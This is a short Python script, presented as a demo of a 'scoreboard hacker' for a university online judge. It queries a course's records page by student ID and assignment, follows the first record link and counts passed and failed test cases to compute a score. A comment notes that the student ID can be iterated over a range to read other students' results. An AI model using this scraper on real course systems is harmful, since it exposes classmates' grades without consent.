# a demo to show the working principle of joj scoreboard hacker

import requests

# first prompt to get information. stud_id can be set within a range
stud_id = 520370910097  # I use my own sjtu id to avoid privacy leak here
base_url = "https://joj.sjtu.edu.cn/d/ve280_summer_2022_paul/"  # VE280 SU22
assignment = "62d078c1dec511000876c05d"

# start search process
url = base_url + "records?uid_or_name=" + str(stud_id) + "&pid=&tid=" + assignment
r = requests.get(url)  # can use param, but let's be straightforward here
res1 = str(r.content)
place1 = res1.find("data-rid") # place==-1 means id not found. will be tackled later
place_start = res1.find('\"', place1)
place_end = res1.find('\"', place_start+1)
link_id = res1[place_start+1:place_end]
url_score_page = base_url + "records/" + link_id
print(url_score_page)  # link to the first record of the student in this assignment. It's the sentence test
r2 = requests.get(url_score_page)
res2 = str(r2.content)

# count ac and all results. if "Compile Error" is found, get 0 directly
AC_count = res2.count("icon pass")
count = res2.count("icon pass") + res2.count("icon fail")
if AC_count == count:
    AC_count -= 1
    count -= 1
else:
    count -= 1
print(f"total case: {count}, accepted case: {AC_count}, score: {100*AC_count/count}")

